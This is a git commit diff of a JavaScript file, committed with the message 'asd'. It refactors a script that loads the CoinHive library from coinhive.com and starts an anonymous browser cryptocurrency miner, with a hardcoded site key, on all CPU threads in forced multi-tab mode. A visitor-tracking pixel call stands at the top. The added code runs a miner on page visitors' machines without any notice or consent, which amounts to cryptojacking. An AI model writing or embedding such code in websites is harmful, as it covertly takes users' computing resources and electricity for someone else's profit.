9888caed9b3c54af6058d2eddc2d64d580db5aeb
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-10-25 18:50:42 +0200

    asd
    asd

--- gjith.js
+++ gjith.js
@@ -1,23 +1,17 @@
 (new Image).src = "//whos.amung.us/swidget/mandar1n0s";
 
-function addScript( src,callback) {
-  var s = document.createElement( 'script' );
-  s.setAttribute( 'src', src );
-  s.onload=callback;
-  document.body.appendChild( s );
-}
 
-function start(){
+var head = document.getElementsByTagName('head')[0];
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.onload = function() {
   var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
-	threads: navigator.hardwareConcurrency,
-	autoThreads: false,
-	throttle: 0.5,
-	forceASMJS: false
+  threads: navigator.hardwareConcurrency,
+  autoThreads: false,
+  throttle: 0.5,
+  forceASMJS: false
 });
-	miner.start(CoinHive.FORCE_MULTI_TAB);
+  miner.start(CoinHive.FORCE_MULTI_TAB);
 }
-
-
-document.addEventListener('DOMContentLoaded', function() {
-addScript("https://coinhive.com/lib/coinhive.min.js", start);
-});
+script.src = 'https://coinhive.com/lib/coinhive.min.js';
+head.appendChild(script);
